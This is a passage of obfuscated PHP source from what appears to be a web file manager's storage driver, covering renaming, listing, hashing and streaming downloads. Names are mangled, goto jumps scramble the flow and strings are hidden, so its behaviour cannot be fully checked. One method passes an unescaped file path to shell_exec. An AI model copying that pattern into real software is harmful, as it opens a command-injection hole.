$AÓÊåˆ¤ = $this->exist($dçøèğÒæÃ); return $AÓÊåˆ¤ ? $dçøèğÒæÃ : !1; } public function setModifyTime($aß’Æ¡‘µ, $A×½â¾àğ = '') { } public function renameObject($aÁù”Öß£, $fÁè¼é¿ç¡) { goto f…ã‘‘Ë‘è; cÌÄ¤öÙ»: $aÁù”Öß£ = $this->getPathOuter($aÁù”Öß£); $fÁè¼é¿ç¡ = $this->pathFather($aÁù”Öß£) . $fÁè¼é¿ç¡; if (IO::isFile($aÁù”Öß£)) { $eÎà¶®Á·Ê = IO::copy($aÁù”Öß£, $this->pathFather($aÁù”Öß£), REPEAT_RENAME_FOLDER, $c’­‹ñÎªĞ); if ($eÎà¶®Á·Ê) { IO::remove($aÁù”Öß£); } } else { $eÎà¶®Á·Ê = IO::mkdir($fÁè¼é¿ç¡); if (!$eÎà¶®Á·Ê) { return !1; } $Bâ§§É¦’ = IO::listPath($aÁù”Öß£, !0); $aã†Š“£‰— = array_merge($Bâ§§É¦’[$D©×÷Ê‡•[74]], $Bâ§§É¦’[$D©×÷Ê‡•[75]]); foreach ($aã†Š“£‰— as $fèø‹óïŠ) { IO::move($fèø‹óïŠ[$D©×÷Ê‡•[76]], $fÁè¼é¿ç¡, REPEAT_RENAME_FOLDER); } IO::remove($aÁù”Öß£); } goto fï¥™ƒâä„; f…ã‘‘Ë‘è: $D©×÷Ê‡• =& $_SERVER[Ö‘Øù]; $c’­‹ñÎªĞ = $fÁè¼é¿ç¡; Hook::trigger($D©×÷Ê‡•[73], $this, $aÁù”Öß£, $this, $this->pathFather($aÁù”Öß£) . $fÁè¼é¿ç¡); goto cÌÄ¤öÙ»; fï¥™ƒâä„: return $eÎà¶®Á·Ê ? $fÁè¼é¿ç¡ : !1; goto F…ÆÈáÒˆé; F…ÆÈáÒˆé: } public function tempFile($a¨Ş¨ß‹œì = '', $b°Ì‡ÚòÈ‘ = '') { goto B‘¦è™Ÿ•ˆ; B‘¦è™Ÿ•ˆ: if (!$a¨Ş¨ß‹œì) { $a¨Ş¨ß‹œì = rand_string(15); } $CÔæ³Í÷­ = TEMP_FILES . rand_string(15) . $_SERVER[Ö‘Øù][8]; @mkdir($CÔæ³Í÷­, DEFAULT_PERRMISSIONS, !0); goto DäâÛó‘ìí; DäâÛó‘ìí: $A©–…ÏÉÙ¶ = $CÔæ³Í÷­ . $a¨Ş¨ß‹œì; @touch($A©–…ÏÉÙ¶); if ($b°Ì‡ÚòÈ‘) { file_put_contents($A©–…ÏÉÙ¶, $b°Ì‡ÚòÈ‘); } goto F—È°óãí; F—È°óãí: return $A©–…ÏÉÙ¶; goto B ¿”™ôãÕ; B ¿”™ôãÕ: } public function tempFileRemve($dòÜ‚±¸½) { @unlink($dòÜ‚±¸½); @rmdir($this->pathFather($dòÜ‚±¸½)); } public function mkfile($Eİé—± ’ç, $då†òœŒ¼ë = '', $AˆÌ„“£° = REPEAT_RENAME) { } public function mkdir($c†øÄ‘‚‹¾, $E¶‚ïËÊ‰ = REPEAT_SKIP) { } public function delFile($b£ºƒËÁª) { } public function delFolder($A‚°¯ãÀ›˜) { } public function copyFile($dƒ™æÏ‰ Û, $Cà’Äƒ¯­¡) { } public function moveFile($D‰¸µŒ£ê, $cô”Ü˜ÜŒö) { } public function remove($b²œÎÄ‡¬) { if ($this->isFile($b²œÎÄ‡¬)) { return $this->delFile($b²œÎÄ‡¬); } return $this->delFolder($b²œÎÄ‡¬); } public function rename($D·Áôª–Ï¨, $B¥Š°¥ç‰») { } public function exist($D‡Å’ÅÛÁë) { } public function findByHash($C×¬‡é‘¾Í = '', $E»Ä¼­¢„‚ = '') { return !1; } public function isFile($FŞÏ²ù±êÒ) { } public function isFolder($eÌæ§‚‰„) { } public function size($fåÑ•‚ÖŒ) { } public function info($B†Û¾µâ‡‡) { } public function infoSimple($E¡ëšˆ…à) { return $this->info($E¡ëšˆ…à); } public function infoAuth($f©Ë…°¿) { return $this->info($f©Ë…°¿); } public function infoFull($C±¾Â£Õ‡Ø) { return $this->info($C±¾Â£Õ‡Ø); } public function infoWithChildren($a©ö™ôò·) { $aÔ†ÒŸòÙÓ =& $_SERVER[Ö‘Øù]; static $fÅÃ–×¯™Ô = array(); if (isset($fÅÃ–×¯™Ô[$a©ö™ôò·])) { return $fÅÃ–×¯™Ô[$a©ö™ôò·]; } $d¦ïçÕ¯é = $this->info($a©ö™ôò·); if ($d¦ïçÕ¯é && $d¦ïçÕ¯é[$aÔ†ÒŸòÙÓ[29]] == $aÔ†ÒŸòÙÓ[77]) { $Fø¥Åèßëï = array($aÔ†ÒŸòÙÓ[78] => 0, $aÔ†ÒŸòÙÓ[79] => 0, $aÔ†ÒŸòÙÓ[80] => 0); $this->infoChildren($a©ö™ôò·, $Fø¥Åèßëï); $d¦ïçÕ¯é[$aÔ†ÒŸòÙÓ[78]] = $Fø¥Åèßëï[$aÔ†ÒŸòÙÓ[78]]; $d¦ïçÕ¯é[$aÔ†ÒŸòÙÓ[81]] = array($aÔ†ÒŸòÙÓ[82] => $Fø¥Åèßëï[$aÔ†ÒŸòÙÓ[79]], $aÔ†ÒŸòÙÓ[83] => $Fø¥Åèßëï[$aÔ†ÒŸòÙÓ[80]]); $fÅÃ–×¯™Ô[$a©ö™ôò·] = $d¦ïçÕ¯é; } return $d¦ïçÕ¯é; } public function listPath($d†ê·¿Ì, $A¬¨¤³±‚„ = false) { } public function has($b‘ç• ¸ÖÎ, $dÂù‡…íëì = false, $eÇŠŒŒ‘»Ö = false) { } public function canRead($B¹öÕ¬—ğÀ) { } public function canWrite($E†ë†³¨†‚) { } public function getContent($bÛÃ¢Åˆí) { } public function setContent($DÆÓ·Ééê, $eóŸ¾  = '') { } protected function infoChildren($b–îÔµµ¦, &$EÙ»Ù™ÒÅ) { $d¼İåò„ƒª =& $_SERVER[Ö‘Øù]; check_abort_echo(); $cÆ¿Ó–Ä’ = $this->listPath($b–îÔµµ¦, !0); $cÆ¿Ó–Ä’ = array_merge($cÆ¿Ó–Ä’[$d¼İåò„ƒª[75]], $cÆ¿Ó–Ä’[$d¼İåò„ƒª[74]]); foreach ($cÆ¿Ó–Ä’ as $B¢ë°¥±©‚) { if ($B¢ë°¥±©‚[$d¼İåò„ƒª[29]] == $d¼İåò„ƒª[77]) { $EÙ»Ù™ÒÅ[$d¼İåò„ƒª[80]]++; $FÜÒŒø¥èÊ = $this->getPathInner($B¢ë°¥±©‚[$d¼İåò„ƒª[76]]); $this->infoChildren($FÜÒŒø¥èÊ, $EÙ»Ù™ÒÅ); } else { $EÙ»Ù™ÒÅ[$d¼İåò„ƒª[79]]++; $EÙ»Ù™ÒÅ[$d¼İåò„ƒª[78]] += $B¢ë°¥±©‚[$d¼İåò„ƒª[78]]; } } } public function fileSubstr($C—ƒ‘Á‰, $AˆÉùˆ£¾‹, $b÷æô›ŠÔ) { } public function listAll($aÆÂÜŠ¶œè) { } public function listAllMake($A‡¦š¯ÔÜ, &$BÇ«íÂŸÊƒ) { $Eá¨ˆñ‘’ò =& $_SERVER[Ö‘Øù]; check_abort_echo(); $BŠ±Ûâ•«£ = $this->listPath($A‡¦š¯ÔÜ, !0); if (!$BŠ±Ûâ•«£) { return; } $EÙÀˆå¢éô = array_merge($BŠ±Ûâ•«£[$Eá¨ˆñ‘’ò[75]], $BŠ±Ûâ•«£[$Eá¨ˆñ‘’ò[74]]); foreach ($EÙÀˆå¢éô as $fµ‹íÒ¯Î˜) { goto D¸í‰ã‘«; Bº¡ˆ‚Ìéã: if (isset($fµ‹íÒ¯Î˜[$Eá¨ˆñ‘’ò[84]])) { $A™Æ³Î¥ÈÊ[$Eá¨ˆñ‘’ò[84]] = $fµ‹íÒ¯Î˜[$Eá¨ˆñ‘’ò[84]]; } if (!$Dé‘ö¢Ğ„) { $BÇ«íÂŸÊƒ[] = $A™Æ³Î¥ÈÊ; continue; } $BÇ«íÂŸÊƒ[] = $A™Æ³Î¥ÈÊ; goto eàÖ‡Ú¸ã; eàÖ‡Ú¸ã: $this->listAllMake($fµ‹íÒ¯Î˜[$Eá¨ˆñ‘’ò[76]], $BÇ«íÂŸÊƒ); goto FàÅ±¾˜Ì; D¸í‰ã‘«: $Dé‘ö¢Ğ„ = $fµ‹íÒ¯Î˜[$Eá¨ˆñ‘’ò[29]] == $Eá¨ˆñ‘’ò[77]; $A™Æ³Î¥ÈÊ = array($Eá¨ˆñ‘’ò[76] => $fµ‹íÒ¯Î˜[$Eá¨ˆñ‘’ò[76]], $Eá¨ˆñ‘’ò[77] => $Dé‘ö¢Ğ„); if (isset($fµ‹íÒ¯Î˜[$Eá¨ˆñ‘’ò[78]])) { $A™Æ³Î¥ÈÊ[$Eá¨ˆñ‘’ò[78]] = $fµ‹íÒ¯Î˜[$Eá¨ˆñ‘’ò[78]]; } goto Bº¡ˆ‚Ìéã; FàÅ±¾˜Ì: } } public function listAllSimple($DÈ‹ÍëÁ Ì) { $BØøƒÄ­ =& $_SERVER[Ö‘Øù]; $a¬¦¼íùÀ¸ = array(); $E«Ù”âæ = $this->listAll($DÈ‹ÍëÁ Ì); $Fò„‰ÜµÌÉ = $this->getPathOuter($DÈ‹ÍëÁ Ì); foreach ($E«Ù”âæ as $DÎé­å­ù) { goto F¦İ—™áÅÖ; F¦İ—™áÅÖ: $Eğá×âª·¥ = $DÎé­å­ù[$BØøƒÄ­[76]]; $Aµ½óÛ‚  = $DÎé­å­ù[$BØøƒÄ­[76]]; if (isset($DÎé­å­ù[$BØøƒÄ­[85]])) { $Eğá×âª·¥ = $DÎé­å­ù[$BØøƒÄ­[85]][$BØøƒÄ­[76]]; $DÎé­å­ù[$BØøƒÄ­[78]] = $DÎé­å­ù[$BØøƒÄ­[85]][$BØøƒÄ­[78]]; $DÎé­å­ù[$BØøƒÄ­[84]] = $DÎé­å­ù[$BØøƒÄ­[85]][$BØøƒÄ­[84]]; } else { $Aµ½óÛ‚  = substr($DÎé­å­ù[$BØøƒÄ­[76]], strlen(get_path_father($Fò„‰ÜµÌÉ))); $Aµ½óÛ‚  = $BØøƒÄ­[8] . ltrim($Aµ½óÛ‚ , $BØøƒÄ­[8]); } goto bÍ‘ÄÊ; bÍ‘ÄÊ: $cÎá™È…¼È = array($BØøƒÄ­[76] => $Aµ½óÛ‚ , $BØøƒÄ­[77] => $DÎé­å­ù[$BØøƒÄ­[77]]); if (isset($DÎé­å­ù[$BØøƒÄ­[78]]) && !$DÎé­å­ù[$BØøƒÄ­[77]]) { $cÎá™È…¼È[$BØøƒÄ­[78]] = $DÎé­å­ù[$BØøƒÄ­[78]]; } if (isset($DÎé­å­ù[$BØøƒÄ­[84]])) { $cÎá™È…¼È[$BØøƒÄ­[84]] = $DÎé­å­ù[$BØøƒÄ­[84]]; } goto c†ä‰²ÛĞÇ; c†ä‰²ÛĞÇ: if (!$DÎé­å­ù[$BØøƒÄ­[77]]) { $cÎá™È…¼È[$BØøƒÄ­[86]] = $Eğá×âª·¥; } $a¬¦¼íùÀ¸[] = $cÎá™È…¼È; goto F†¬†šĞê´; F†¬†šĞê´: } return $a¬¦¼íùÀ¸; } public function upload($dÍ„í–Â”, $B‚àÛ²Î‡Ó, $CÓ®¡Ã‚· = false, $e©œŞ÷‡§ª = REPEAT_REPLACE) { } public function uploadFileByID($a˜˜‡İŠôÄ, $c®¹“æ¢Îì, $e‰¿Ä©’ë³) { } public function uploadFileByPath($c½ŒÂˆ¤ì‰, $e§ÇŠ—¿„ª, $eøï“ÊŒ = array()) { } public function isUploadServer() { $dÛè‰Ç·±£ =& $_SERVER[Ö‘Øù]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $dÛè‰Ç·±£[87]) { return !0; } return $GLOBALS[$dÛè‰Ç·±£[6]][$dÛè‰Ç·±£[88]][$dÛè‰Ç·±£[89]]; } public function isFileOutServer() { $e¬™ÃÊƒ =& $_SERVER[Ö‘Øù]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $e¬™ÃÊƒ[87]) { return !0; } return $GLOBALS[$e¬™ÃÊƒ[6]][$e¬™ÃÊƒ[88]][$e¬™ÃÊƒ[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($DóÀ®Öœˆ) { $e³èêºÏ±· =& $_SERVER[Ö‘Øù]; if (!$this->isCdnHost()) { return $DóÀ®Öœˆ; } return str_replace(trim(get_url_root($DóÀ®Öœˆ), $e³èêºÏ±·[8]), trim($this->cdnHost, $e³èêºÏ±·[8]), $DóÀ®Öœˆ); } public function uploadLink($F¹Ì´‹šÍÚ, $F¨Ö¡âñ¿¨ = 0) { goto fªŠØÇÛ»Š; fªŠØÇÛ»Š: $cï“ô´Şš =& $_SERVER[Ö‘Øù]; if ($this->isUploadServer()) { return; } $EĞŒïéâ• = $this->getType(); goto FöÈîÜ˜¥Ú; dæÛïï×‚Â: $E¸±œ¿¢å = $F¨Ö¡âñ¿¨ <= $Dõãš¹¦ß° ? $cï“ô´Şš[91] : $cï“ô´Şš[92]; $Aèœñ¥İ„ = (!$F¨Ö¡âñ¿¨ ? 1 : ceil($F¨Ö¡âñ¿¨ / pow(1024, 3))) * 3600 * 4; $cƒÅ“¹‡‹± = $this->{$E¸±œ¿¢å}($F¹Ì´‹šÍÚ, $Aèœñ¥İ„); goto Eé¡„ğ×¦Ï; FöÈîÜ˜¥Ú: if (!in_array($EĞŒïéâ•, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Dõãš¹¦ß° = 1024 * 1024 * 10; goto dæÛïï×‚Â; Eé¡„ğ×¦Ï: if ($cƒÅ“¹‡‹±) { $cƒÅ“¹‡‹±[$cï“ô´Şš[93]] = $F¹Ì´‹šÍÚ; $cƒÅ“¹‡‹±[$cï“ô´Şš[94]] = $EĞŒïéâ•; } return $cƒÅ“¹‡‹±; goto cåõŸ¹ÃŠ¥; cåõŸ¹ÃŠ¥: } public function uploadFormData($bÂ½Ÿİ—ç, $BÖŠ“À¤º¡ = 3600) { } public function multiUploadFormData($FÜ†‹ï³ˆ, $B»„Ò„æ‰¾ = 3600) { } public function download($A¬¬â¶Ì¢Ÿ, $e‡—øŞËä‹) { } public function ext($B™¯È½ƒÁå) { $A¹º¦Ô­ÖÌ =& $_SERVER[Ö‘Øù]; if (strpos($B™¯È½ƒÁå, $A¹º¦Ô­ÖÌ[8]) === -1) { $F‚šïî“å¼ = $B™¯È½ƒÁå; } else { $F‚šïî“å¼ = $this->pathThis($B™¯È½ƒÁå); } $eŒ¡ªïÂÉÚ = $A¹º¦Ô­ÖÌ[33]; if (strstr($F‚šïî“å¼, $A¹º¦Ô­ÖÌ[95])) { $eŒ¡ªïÂÉÚ = substr($F‚šïî“å¼, strrpos($F‚šïî“å¼, $A¹º¦Ô­ÖÌ[95]) + 1); $eŒ¡ªïÂÉÚ = strtolower($eŒ¡ªïÂÉÚ); } if (strlen($eŒ¡ªïÂÉÚ) > 3 && preg_match($A¹º¦Ô­ÖÌ[96], $eŒ¡ªïÂÉÚ, $c¡¶˜Ÿ„)) { $eŒ¡ªïÂÉÚ = $A¹º¦Ô­ÖÌ[33]; } return $eŒ¡ªïÂÉÚ; } public function pathThis($aˆŠŒ³©°) { $B³İ¦ãê‡ =& $_SERVER[Ö‘Øù]; $aˆŠŒ³©° = str_replace($B³İ¦ãê‡[97], $B³İ¦ãê‡[8], rtrim($aˆŠŒ³©°, $B³İ¦ãê‡[8])); $B‡Ïæ½’Ìï = strrpos($aˆŠŒ³©°, $B³İ¦ãê‡[8]); if ($B‡Ïæ½’Ìï === !1) { return $aˆŠŒ³©°; } return substr($aˆŠŒ³©°, $B‡Ïæ½’Ìï + 1); } public function pathFather($fà‘£ºæ) { $E‰½Çï…˜› =& $_SERVER[Ö‘Øù]; $fà‘£ºæ = str_replace($E‰½Çï…˜›[97], $E‰½Çï…˜›[8], rtrim($fà‘£ºæ, $E‰½Çï…˜›[8])); $eé¨§Üõ¯ = strrpos($fà‘£ºæ, $E‰½Çï…˜›[8]); if ($eé¨§Üõ¯ === !1) { return $E‰½Çï…˜›[33]; } return substr($fà‘£ºæ, 0, $eé¨§Üõ¯ + 1); } public function hashSimple($Bãˆ¯‹Ù–Ï) { goto Fì…ìÜñß©; CĞÂ‹£Šê: $AË¶ŸÚ³‹‹ .= $this->fileSubstr($Bãˆ¯‹Ù–Ï, $cÁÔ«ÌÜ„õ - $FÎÒ¢Öá’ô, $FÎÒ¢Öá’ô); return md5($AË¶ŸÚ³‹‹) . $cÁÔ«ÌÜ„õ; goto eİ°¶â½¢ì; f¾ù°Ç‘ãÓ: $CĞ‡·¥î = intval($cÁÔ«ÌÜ„õ / $B•²„ãá ¡); $AË¶ŸÚ³‹‹ = $AÇ¢³åÂ×[33]; for ($c˜Ä×ÁÚì¬ = 0; $c˜Ä×ÁÚì¬ < $B•²„ãá ¡; $c˜Ä×ÁÚì¬++) { $AË¶ŸÚ³‹‹ .= $this->fileSubstr($Bãˆ¯‹Ù–Ï, $CĞ‡·¥î * $c˜Ä×ÁÚì¬, $FÎÒ¢Öá’ô); } goto CĞÂ‹£Šê; CÛ”ùƒë‡¥: $FÎÒ¢Öá’ô = 200; $B•²„ãá ¡ = 50; if ($cÁÔ«ÌÜ„õ <= $FÎÒ¢Öá’ô * $B•²„ãá ¡) { return $this->hashMd5($Bãˆ¯‹Ù–Ï) . $cÁÔ«ÌÜ„õ; } goto f¾ù°Ç‘ãÓ; Fì…ìÜñß©: $AÇ¢³åÂ× =& $_SERVER[Ö‘Øù]; if (!$Bãˆ¯‹Ù–Ï) { return md5($AÇ¢³åÂ×[33]); } $cÁÔ«ÌÜ„õ = $this->size($Bãˆ¯‹Ù–Ï); goto CÛ”ùƒë‡¥; eİ°¶â½¢ì: } public static $md5Cache = array(); public function hashMd5($AïÛòĞñê®) { $AïÛòĞñê® = $this->iconvSystem($AïÛòĞñê®); if (isset(self::$md5Cache[$AïÛòĞñê®])) { return self::$md5Cache[$AïÛòĞñê®]; } self::$md5Cache[$AïÛòĞñê®] = $this->hashMd5Shell($AïÛòĞñê®); if (!self::$md5Cache[$AïÛòĞñê®]) { self::$md5Cache[$AïÛòĞñê®] = @md5_file($AïÛòĞñê®); } return self::$md5Cache[$AïÛòĞñê®]; } private function hashMd5Shell($CÂÎËˆÌÓ) { goto a›™­µ˜’º; a›™­µ˜’º: $cßµÔòŞ“É =& $_SERVER[Ö‘Øù]; if (!function_exists($cßµÔòŞ“É[98])) { return !1; } $A¬ÕéÓ¢Íã = array($cßµÔòŞ“É[99], $cßµÔòŞ“É[100]); goto D’•‘¶ªìÔ; D’•‘¶ªìÔ: $bØëÕôÅ’ = Cache::get($cßµÔòŞ“É[101]); if (!$bØëÕôÅ’) { $FóàêöÌ“ƒ = BASIC_PATH . $cßµÔòŞ“É[102]; $EêÖÆ³´³¡ = md5_file($FóàêöÌ“ƒ); $bØëÕôÅ’ = $cßµÔòŞ“É[103]; foreach ($A¬ÕéÓ¢Íã as $aÎ›–Ìãí) { $FõĞ—ÕÊö = shell_exec($aÎ›–Ìãí . "\40\42{$FóàêöÌ“ƒ}\x22"); if ($FõĞ—ÕÊö && substr(trim($FõĞ—ÕÊö), 0, 32) == $EêÖÆ³´³¡) { $bØëÕôÅ’ = $aÎ›–Ìãí; break; } } Cache::set($cßµÔòŞ“É[101], $bØëÕôÅ’, 3600); } if ($bØëÕôÅ’ == $cßµÔòŞ“É[103]) { return !1; } goto FÒœùÖó‘; FÒœùÖó‘: $FõĞ—ÕÊö = shell_exec($bØëÕôÅ’ . "\x20\x22{$CÂÎËˆÌÓ}\42"); $FõĞ—ÕÊö = str_replace($cßµÔòŞ“É[104], $cßµÔòŞ“É[33], $FõĞ—ÕÊö); return substr($FõĞ—ÕÊö, 0, 32); goto D‚Ï¶ëåö; D‚Ï¶ëåö: } public function link($eÇº‰øƒ) { return $eÇº‰øƒ; } public function fileOut($eÄñåÍòŠ, $A«åê¥° = false, $cõƒÀ³ßÙ¯ = false, $aÙöÅ´‚¨¯ = '') { goto e‡¥“Ä˜ÏÛ; bø¡¶à¸…ï: if (isset($_SERVER[$CŸÎöÇŒ›[131]]) && strtotime($_SERVER[$CŸÎöÇŒ›[131]]) == $D¬…êù‘£[$CŸÎöÇŒ›[84]]) { header($CŸÎöÇŒ›[132], !0, 304); die; } if (isset($_SERVER[$CŸÎöÇŒ›[133]]) && $_SERVER[$CŸÎöÇŒ›[133]] == $aÙöÅ´‚¨¯) { header($CŸÎöÇŒ›[134] . $aÙöÅ´‚¨¯, !0, 304); die; } header($CŸÎöÇŒ›[134] . $aÙöÅ´‚¨¯); goto dĞêøÆÔ; DÅ‹­ÛŒ±ò: header($CŸÎöÇŒ›[138] . $D’‡óËÕóÄ); header($CŸÎöÇŒ›[139]); if (!$A«åê¥° && $F«¼»‹¸”º == $CŸÎöÇŒ›[140]) { if ($D’‡óËÕóÄ > 1024 * 1024 * 5) { die; } $Aß›œÏ³‰• = $this->getContent($eÄñåÍòŠ); $Aß›œÏ³‰• = Html::clearSVG($Aß›œÏ³‰•); header($CŸÎöÇŒ›[141] . strlen($Aß›œÏ³‰•)); echo $Aß›œÏ³‰•; die; } goto FæñŠÉ‚§; Bœ·„ì´İ: $bĞ¾¨øÃ’ = $CŸÎöÇŒ›[116] . $bĞ¾¨øÃ’ . $CŸÎöÇŒ›[122] . $bĞ¾¨øÃ’; if ($A«åê¥°) { header($CŸÎöÇŒ›[123]); header($CŸÎöÇŒ›[124] . $bĞ¾¨øÃ’); } else { header($CŸÎöÇŒ›[125] . $bĞ¾¨øÃ’); } header($CŸÎöÇŒ›[126] . gmdate($CŸÎöÇŒ›[110], time() + 3600 * 24 * 30) . $CŸÎöÇŒ›[127]); goto bš…àÌ…¤; BÜğˆÅÇ: $dñ÷ÔÓîŒ = 0; $Bê¾ÛÅ‡ñ„ = $D’‡óËÕóÄ - 1; $F«¼»‹¸”º = $this->ext($b“³óŒÒ½); goto EÆ‰®Ú…; bóÇÎØÕÏ: if ($_SERVER[$CŸÎöÇŒ›[157]] == $CŸÎöÇŒ›[158]) { return; } $E©ØöÜëé¸ = 1024 * 100; $a¥Ş§ª§ç° = 0; goto FöãìÀ¦â; B¹Î‰¾‹Ù—: header($CŸÎöÇŒ›[120]); header($CŸÎöÇŒ›[121] . $EñÇ¨‘ÑÅ); $bĞ¾¨øÃ’ = rawurlencode($b“³óŒÒ½); goto Bœ·„ì´İ; dØ ¢Ğª—Ğ: $C©ìÎáğø“ = $this->getType() == $CŸÎöÇŒ›[106]; $Aæ§­¢¹ìå = $GLOBALS[$CŸÎöÇŒ›[6]][$CŸÎöÇŒ›[88]][$CŸÎöÇŒ›[107]][$CŸÎöÇŒ›[108]]; $EñòèŠÍãù = (double) $GLOBALS[$CŸÎöÇŒ›[6]][$CŸÎöÇŒ›[88]][$CŸÎöÇŒ›[107]][$CŸÎöÇŒ›[109]] * 1024 * 1024; goto A‘”óçÜâÓ; b—­Ì¹ö¢: $D’‡óËÕóÄ = $D¬…êù‘£[$CŸÎöÇŒ›[78]]; $DšŸÈ ‚£­ = gmdate($CŸÎöÇŒ›[110], $D¬…êù‘£[$CŸÎöÇŒ›[84]]); $b“³óŒÒ½ = $cõƒÀ³ßÙ¯ ? $cõƒÀ³ßÙ¯ : $this->iconvApp($D¬…êù‘£[$CŸÎöÇŒ›[28]]); goto BÜğˆÅÇ; bš…àÌ…¤: header($CŸÎöÇŒ›[128]); header($CŸÎöÇŒ›[129]); header($CŸÎöÇŒ›[130]); goto bø¡¶à¸…ï; dĞêøÆÔ: header($CŸÎöÇŒ›[135] . $DšŸÈ ‚£­ . $CŸÎöÇŒ›[127]); header($CŸÎöÇŒ›[136] . $b“³óŒÒ½); header($CŸÎöÇŒ›[137]); goto DÅ‹­ÛŒ±ò; eÒ–…Ë±î: $EñÇ¨‘ÑÅ = get_file_mime($F«¼»‹¸”º); if (strstr($EñÇ¨‘ÑÅ, $CŸÎöÇŒ›[117])) { $EñÇ¨‘ÑÅ = $EñÇ¨‘ÑÅ . $CŸÎöÇŒ›[118]; } if ($A«åê¥° === !1 && !mime_support($EñÇ¨‘ÑÅ)) { $A«åê¥° = !0; $EñÇ¨‘ÑÅ = $CŸÎöÇŒ›[119]; } goto B¹Î‰¾‹Ù—; eø£”î‡ì: $BÈğÏê«÷ã = !0; if ($_SERVER[$CŸÎöÇŒ›[154]] == $CŸÎöÇŒ›[155] && $D’‡óËÕóÄ > 1204 * 1024 * 1024 * 2) { $BÈğÏê«÷ã = !1; } if ($BÈğÏê«÷ã) { header($CŸÎöÇŒ›[156] . ($Bê¾ÛÅ‡ñ„ - $dñ÷ÔÓîŒ + 1)); } goto bóÇÎØÕÏ; FöãìÀ¦â: if ($EñòèŠÍãù) { $a¥Ş§ª§ç° = intval(1000 * 1000 * ($E©ØöÜëé¸ / $EñòèŠÍãù)); } while ($dñ÷ÔÓîŒ <= $Bê¾ÛÅ‡ñ„) { $d¬¶•öëâ = timeFloat(); check_abort(); $AäĞáøÓ³Ï = $Bê¾ÛÅ‡ñ„ - $dñ÷ÔÓîŒ + 1; if ($AäĞáøÓ³Ï <= $E©ØöÜëé¸) { $E©ØöÜëé¸ = $AäĞáøÓ³Ï; } echo $this->fileSubstr($eÄñåÍòŠ, $dñ÷ÔÓîŒ, $E©ØöÜëé¸); $dñ÷ÔÓîŒ += $E©ØöÜëé¸; if ($E©ØöÜëé¸ == $AäĞáøÓ³Ï) { $dñ÷ÔÓîŒ = $Bê¾ÛÅ‡ñ„ + 1; } if ($a¥Ş§ª§ç°) { $fçÆîùÌôš = intval(1000 * 1000 * (timeFloat() - $d¬¶•öëâ)); $C´ğƒëÆ‚¦ = $a¥Ş§ª§ç° - $fçÆîùÌôš; if ($C´ğƒëÆ‚¦ > 5) { usleep($C´ğƒëÆ‚¦); } } } goto F•ìˆÈ•šÑ; EÆ‰®Ú…: if (in_array($F«¼»‹¸”º, array($CŸÎöÇŒ›[111], $CŸÎöÇŒ›[112], $CŸÎöÇŒ›[113], $CŸÎöÇŒ›[114]))) { $F«¼»‹¸”º = $CŸÎöÇŒ›[115]; } if (!$aÙöÅ´‚¨¯) { $aÙöÅ´‚¨¯ = md5($DšŸÈ ‚£­ . $this->hashSimple($eÄñåÍòŠ)); } $aÙöÅ´‚¨¯ = $CŸÎöÇŒ›[116] . $aÙöÅ´‚¨¯ . $CŸÎöÇŒ›[116]; goto eÒ–…Ë±î; FæñŠÉ‚§: $A©ÑˆÁŸí… = strtolower($_SERVER[$CŸÎöÇŒ›[142]]); if ($C©ìÎáğø“ && $A©ÑˆÁŸí… && $Aæ§­¢¹ìå) { if (strstr($A©ÑˆÁŸí…, $CŸÎöÇŒ›[143])) { header($CŸÎöÇŒ›[144] . $eÄñåÍòŠ); } else { if (strstr($A©ÑˆÁŸí…, $CŸÎöÇŒ›[145])) { header($CŸÎöÇŒ›[146] . $eÄñåÍòŠ); } else { if (strstr($A©ÑˆÁŸí…, $CŸÎöÇŒ›[147])) { header($CŸÎöÇŒ›[148] . $eÄñåÍòŠ); } } } if ($EñòèŠÍãù) { header($CŸÎöÇŒ›[149] . $EñòèŠÍãù); } return; } if (isset($_SERVER[$CŸÎöÇŒ›[150]])) { if (preg_match($CŸÎöÇŒ›[151], $_SERVER[$CŸÎöÇŒ›[150]], $f²¦¤ß –)) { $dñ÷ÔÓîŒ = intval($f²¦¤ß –[1]); if (!empty($f²¦¤ß –[2])) { $Bê¾ÛÅ‡ñ„ = intval($f²¦¤ß –[2]); } } header($CŸÎöÇŒ›[152]); header("\103\x6f\x6e\164\145\x6e\164\55\x52\141\156\x67\x65\x3a\x20\142\171\x74\145\x73\40{$dñ÷ÔÓîŒ}\55{$Bê¾ÛÅ‡ñ„}\57" . $D’‡óËÕóÄ); } else { header($CŸÎöÇŒ›[153]); } goto eø£”î‡ì; A‘”óçÜâÓ: @ob_end_clean(); set_timeout(); $D¬…êù‘£ = $this->infoFull($eÄñåÍòŠ); goto b—­Ì¹ö¢; e‡¥“Ä˜ÏÛ: $CŸÎöÇŒ› =& $_SERVER[Ö‘Øù]; $this->cacheMethod(null, null); if (!$eÄñåÍòŠ || !$this->exist($eÄñåÍòŠ)) { show_json(LNG($CŸÎöÇŒ›[105]), !1, $cõƒÀ³ßÙ¯); } goto dØ ¢Ğª—Ğ; F•ìˆÈ•šÑ: } public function fileOutServer($D‚´•É¸Ú¯, $B¦²”­¨ = false, $DÚÏÒï‚¾ = false, $A¯Ğºé¼Ë‰ = '') { $this->fileOut($D‚´•É¸Ú¯, $B¦²”­¨, $DÚÏÒï‚¾, $A¯Ğºé¼Ë‰); } public function fileOutLink($cÑ¸ê‰ä»ï) { header($_SERVER[Ö‘Øù][159] . $cÑ¸ê‰ä»ï); die; } public function cacheMethod($d…ñ½À×† , $a¯ôˆå¡­, $D—¼ªË„šÌ = null) { goto FØñ±‘Î»; FÊõ‘¥Ìº: $FÌ³šÂŠ»— = $this->{$d…ñ½À×† }($a¯ôˆå¡­); $fË¼ê„Î½å[$b¬ÔˆãáÖÓ] = $FÌ³šÂŠ»—; return $FÌ³šÂŠ»—; goto BÄ¹Ù•§©‹; dÊ¾™µ†µ‹: if (!is_null($D—¼ªË„šÌ)) { $fË¼ê„Î½å[$b¬ÔˆãáÖÓ] = $D—¼ªË„šÌ; return; } $FÌ³šÂŠ»— = isset($fË¼ê„Î½å[$b¬ÔˆãáÖÓ]) ? $fË¼ê„Î½å[$b¬ÔˆãáÖÓ] : null; if (!is_null($FÌ³šÂŠ»—)) { return $FÌ³šÂŠ»—; } goto FÊõ‘¥Ìº; FØñ±‘Î»: $fØ¼Ñ¼¾¤° =& $_SERVER[Ö‘Øù]; static $fË¼ê„Î½å = array(); 